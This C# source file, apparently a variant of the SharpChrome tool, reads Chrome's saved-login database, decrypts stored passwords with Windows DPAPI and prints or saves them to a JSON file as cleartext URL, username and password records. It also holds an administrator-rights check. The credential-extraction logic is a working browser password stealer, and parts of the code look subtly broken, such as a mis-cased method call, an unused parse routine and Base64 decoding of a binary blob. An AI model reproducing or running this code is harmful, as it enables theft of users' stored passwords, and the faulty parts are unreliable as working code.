using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using System.Reflection;

namespace SharpChrome
{
    using CS_SQLite3;
    using Newtonsoft.Json;

    class Program
    {

        static void Main(string[] args)
        {

 
             
            bool getLogins = true;

            ChromeCredentialManager chromeManager = new ChromeCredentialManager();


            try
            {

                if (getLogins)
                {
                    var logins = chromeManager.GetSavedLogins();
                    var json = JsonConvert.SerializeObject(logins);
                    File.WriteAllText("../../files/savedlogins.json", json);
                    Console.WriteLine("Your datas was wrote to 'savedlogins.json' in 'files' folder!");
                }

                Console.WriteLine("[*] Done.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}\n\n{1}", ex.Message, ex.StackTrace);
            }
		Console.Readkey();
        }
 

        public static void ParseChromeLogins(string loginDataFilePath, string user)
        {
            SQLiteDatabase database = new SQLiteDatabase(loginDataFilePath);
            string query = "SELECT action_url, username_value, password_value FROM logins";
            DataTable resultantQuery = database.ExecuteQuery(query);

            foreach (DataRow row in resultantQuery.Rows)
            {
                byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
                byte[] decBytes = ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser);
                string password = Encoding.ASCII.GetString(decBytes);
                if (password != String.Empty)
                {
                    Console.WriteLine("--- Chrome Credential (User: {0}) ---", user);
                    Console.WriteLine("URL      : {0}", row["action_url"]);
                    Console.WriteLine("Username : {0}", row["username_value"]);
                    Console.WriteLine("Password : {0}", password);
                    Console.WriteLine();
                }
            }
            database.CloseDatabase();
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
